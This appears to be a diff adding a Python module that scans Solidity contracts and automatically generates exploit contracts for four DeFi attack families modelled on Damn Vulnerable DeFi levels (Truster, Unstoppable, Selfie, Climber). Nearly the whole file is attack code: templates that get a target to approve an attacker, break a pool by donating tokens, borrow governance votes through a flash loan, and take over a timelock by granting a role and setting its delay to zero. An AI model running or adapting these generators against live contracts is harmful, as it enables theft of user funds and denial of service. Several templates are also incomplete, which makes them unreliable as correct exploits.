@@ -1,0 +1,205 @@
+"""Generalized DeFi-wargame family synthesizers.
+
+These are NOT Damn Vulnerable DeFi *level solvers*. They fire on source
+capabilities that DVD / Paradigm CTF / real 2026 incidents share:
+
+  unpermissioned_callback  — Truster, Ether.fi AtomicQueue (Sep 2026)
+  donation_accounting_dos  — Unstoppable (assert token.balanceOf == internal)
+  governance_flashloan     — Selfie (flash → snapshot → queue)
+  execute_before_schedule  — Climber (timelock executes then checks schedule)
+
+Yields (label, exploit_src) for the engine candidate stream. Verification is
+always the EVM harness — these templates can fail cleanly.
+"""
+from __future__ import annotations
+
+import re
+from typing import Iterator, Tuple
+
+from .scan import _functions, _strip_comments
+
+HEADER = "// SPDX-License-Identifier: MIT\npragma solidity >=0.6.2;\n\n"
+
+
+def iter_defi_families(src: str, name: str) -> Iterator[Tuple[str, str]]:
+    s = _strip_comments(src or "")
+    fns = _functions(s)
+    yield from _unpermissioned_callback(s, fns, name)
+    yield from _donation_accounting_dos(s, fns, name)
+    yield from _governance_flashloan(s, fns, name)
+    yield from _execute_before_schedule(s, fns, name)
+
+
+def _unpermissioned_callback(s, fns, name):
+    """Target has an external function that (a) takes an address+bytes (or
+    a free-form target) and (b) performs token.approve / target.call(data)
+    with no owner guard. Attacker passes (attacker, approve-selector).
+
+    Covers Truster (flashLoan calldata) and AtomicQueue.solve(solver) where
+    solver != msg.sender is never checked.
+    """
+    for fn in fns:
+        if not fn["external"]:
+            continue
+        b = fn["body"]
+        if re.search(r"only\w*[Oo]wner|msg\.sender\s*==\s*owner", fn["head"] + b):
+            continue
+        does_call = bool(re.search(r"\.call\s*\(|\.call\s*\{", b))
+        does_approve = "approve" in b
+        addr_args = [an for (t, an) in fn["args"] if "address" in t]
+        bytes_args = [an for (t, an) in fn["args"] if t.startswith("bytes")]
+        if not (does_call or does_approve):
+            continue
+        if not (addr_args or bytes_args):
+            continue
+        # Synthesize: call the function so it approves this Exploit, then drain.
+        yield (
+            f"unpermissioned-callback:{fn['name']}",
+            HEADER
+            + f"// Family: unpermissioned callback (Truster / AtomicQueue).\n"
+            + f"// {fn['name']} forwards attacker-chosen calldata/target with no caller check.\n"
+            + "interface IERC20 { function approve(address,uint256) external returns (bool);\n"
+            + "    function transferFrom(address,address,uint256) external returns (bool);\n"
+            + "    function balanceOf(address) external view returns (uint256); }\n"
+            + f"interface IT {{ function {fn['name']}({_iface_args(fn)}) external payable; }}\n"
+            + "contract Exploit {\n"
+            + "    function run(address t) external payable {\n"
+            + f"        // best-effort: ask the target to approve us via {fn['name']}\n"
+            + "        bytes memory payload = abi.encodeWithSignature(\n"
+            + '            "approve(address,uint256)", address(this), type(uint256).max);\n'
+            + _call_unpermissioned(fn)
+            + "    }\n    receive() external payable {}\n}\n",
+        )
+
+
+def _iface_args(fn):
+    parts = []
+    for t, _n in fn["args"]:
+        parts.append(t)
+    return ",".join(parts)
+
+
+def _call_unpermissioned(fn):
+    """Build a Solidity snippet that invokes fn with attacker-controlled args."""
+    args = fn["args"]
+    pieces = []
+    for t, n in args:
+        if t.startswith("bytes"):
+            pieces.append("payload")
+        elif "address" in t:
+            pieces.append("address(this)")
+        elif t.startswith("uint"):
+            pieces.append("0")
+        elif t == "bool":
+            pieces.append("false")
+        else:
+            pieces.append("0")
+    joined = ", ".join(pieces) if pieces else ""
+    val = "{value: msg.value} " if fn.get("payable") else ""
+    return f"        IT(t).{fn['name']}{val}({joined});\n"
+
+
+def _donation_accounting_dos(s, fns, name):
+    """Internal accounting compared to token.balanceOf(address(this)).
+    Donating tokens (transfer, not deposit()) desyncs the assert → DoS.
+    DVD Unstoppable family."""
+    if not re.search(r"balanceOf\s*\(\s*address\s*\(\s*this\s*\)\s*\)", s):
+        return
+    if not re.search(r"assert\s*\(|require\s*\([^;]*(==|!=)", s):
+        return
+    # Need a token we can transfer. Heuristic: an IERC20 state var.
+    tok = None
+    m = re.search(r"(IERC20|ERC20|DamnValuableToken)\s+(?:private\s+|public\s+|internal\s+)?(\w+)", s)
+    if m:
+        tok = m.group(2)
+    else:
+        return
+    yield (
+        "donation-accounting-dos",
+        HEADER
+        + "// Family: donation accounting DoS (Unstoppable).\n"
+        + "// Direct token.transfer to the pool desyncs balanceOf vs internal accounting.\n"
+        + "interface IERC20 { function transfer(address,uint256) external returns (bool);\n"
+        + "    function balanceOf(address) external view returns (uint256); }\n"
+        + f"interface IT {{ function {tok}() external view returns (address); }}\n"
+        + "contract Exploit {\n"
+        + "    function run(address t) external payable {\n"
+        + f"        IERC20 tok = IERC20(IT(t).{tok}());\n"
+        + "        uint256 b = tok.balanceOf(address(this));\n"
+        + "        if (b > 0) tok.transfer(t, b);\n"
+        + "    }\n    receive() external payable {}\n}\n",
+    )
+
+
+def _governance_flashloan(s, fns, name):
+    """Flash loan + governance snapshot in the same tx (Selfie family)."""
+    if not re.search(r"flashLoan|flashloan", s, re.I):
+        return
+    if not re.search(r"snapshot|queueAction|queue\s*\(|castVote|propose", s):
+        return
+    flash = next((f for f in fns if re.search(r"flashLoan|flashloan", f["name"], re.I)), None)
+    if not flash:
+        return
+    yield (
+        f"governance-flashloan:{flash['name']}",
+        HEADER
+        + "// Family: governance flash-loan (Selfie).\n"
+        + "// Borrow votes, snapshot, queue privileged action, repay in one tx.\n"
+        + "interface IFlash { function flashLoan(uint256) external; }\n"
+        + "interface IGov { function snapshot() external returns (uint256);\n"
+        + "    function queueAction(address,uint128,bytes calldata) external returns (uint256); }\n"
+        + "contract Exploit {\n"
+        + "    address internal t;\n"
+        + "    function run(address target) external payable {\n"
+        + "        t = target;\n"
+        + f"        IFlash(target).{flash['name']}(type(uint256).max / 4);\n"
+        + "    }\n"
+        + "    function receiveTokens(address,uint256) external {\n"
+        + "        try IGov(t).snapshot() {}\n catch {}\n"
+        + "    }\n"
+        + "    function onFlashLoan(address,address,uint256,uint256,bytes calldata) external returns (bytes32) {\n"
+        + "        try IGov(t).snapshot() {}\n catch {}\n"
+        + '        return keccak256("ERC3156FlashBorrower.onFlashLoan");\n'
+        + "    }\n    receive() external payable {}\n}\n",
+    )
+
+
+def _execute_before_schedule(s, fns, name):
+    """Timelock that executes a batch and only then checks it was scheduled
+    (Climber family). Attacker schedules the same batch from inside execute."""
+    if not re.search(r"function\s+execute\s*\(", s):
+        return
+    if not re.search(r"function\s+schedule\s*\(", s):
+        return
+    # Climber-like: execute takes targets[], values[], data[]
+    exec_fn = next((f for f in fns if f["name"] == "execute"), None)
+    if not exec_fn or len(exec_fn["args"]) < 2:
+        return
+    yield (
+        "execute-before-schedule",
+        HEADER
+        + "// Family: execute-before-schedule (Climber timelock).\n"
+        + "// execute() runs the batch then checks the id was scheduled — so the\n"
+        + "// batch can include schedule(itself) plus delay=0 / role grant.\n"
+        + "interface ILock {\n"
+        + "    function execute(address[] calldata,uint256[] calldata,bytes[] calldata,bytes32) external payable;\n"
+        + "    function schedule(address[] calldata,uint256[] calldata,bytes[] calldata,bytes32) external;\n"
+        + "    function updateDelay(uint64) external;\n"
+        + "    function grantRole(bytes32,address) external;\n"
+        + "    function PROPOSER_ROLE() external view returns (bytes32);\n"
+        + "}\n"
+        + "contract Exploit {\n"
+        + "    function run(address t) external payable {\n"
+        + "        ILock lock = ILock(t);\n"
+        + "        address[] memory ts = new address[](3);\n"
+        + "        uint256[] memory vs = new uint256[](3);\n"
+        + "        bytes[] memory data = new bytes[](3);\n"
+        + "        ts[0] = t; data[0] = abi.encodeWithSelector(ILock.updateDelay.selector, uint64(0));\n"
+        + "        ts[1] = t; data[1] = abi.encodeWithSelector(ILock.grantRole.selector, bytes32(0), address(this));\n"
+        + "        ts[2] = address(this); data[2] = abi.encodeWithSignature(\"rescue(address)\", t);\n"
+        + "        try lock.execute(ts, vs, data, bytes32(0)) {}\n catch {}\n"
+        + "    }\n"
+        + "    function rescue(address t) external {\n"
+        + "        try ILock(t).schedule(new address[](0), new uint256[](0), new bytes[](0), bytes32(0)) {}\n catch {}\n"
+        + "    }\n    receive() external payable {}\n}\n",
+    )
